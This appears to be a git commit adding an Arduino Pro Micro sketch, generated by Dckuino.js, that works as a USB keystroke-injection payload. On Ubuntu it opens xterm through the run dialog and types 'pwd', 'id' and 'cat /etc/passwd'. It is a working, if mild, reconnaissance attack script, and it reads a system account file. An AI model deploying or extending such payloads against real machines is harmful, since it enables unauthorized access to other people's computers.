5572689df8aa130dd7d18c7e57a30de4669193f1
TheFrenchGuy <30523707+TheFrenchGuy@users.noreply.github.com>
2017-08-01 08:16:25 +0100

    Payload Basic Terminal Commands Ubuntu
    The following script is an example of how to execute commands in Ubuntu Linux through xterm. The script first initiates the run application window through ubuntu and later on it triggers the command xterm. After the execution of the terminal it issues the commands "pwd", "id" and "cat /etc/passwd".
    
    DELAY 3000

---
+++ Payload_Basic_Terminal_Commands_Ubuntu_ArduinoProMicro/Payload_Basic_Terminal_Commands_Ubuntu_ArduinoProMicro.ino
@@ -0,0 +1,66 @@
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(3000);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F2);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.print("xterm");
+
+  delay(500);
+
+  typeKey(KEY_RETURN);
+
+  delay(750);
+
+  Keyboard.print("pwd");
+
+  delay(500);
+
+  typeKey(KEY_RETURN);
+
+  delay(300);
+
+  Keyboard.print("id");
+
+  delay(300);
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  Keyboard.print("cat /etc/passwd");
+
+  delay(500);
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
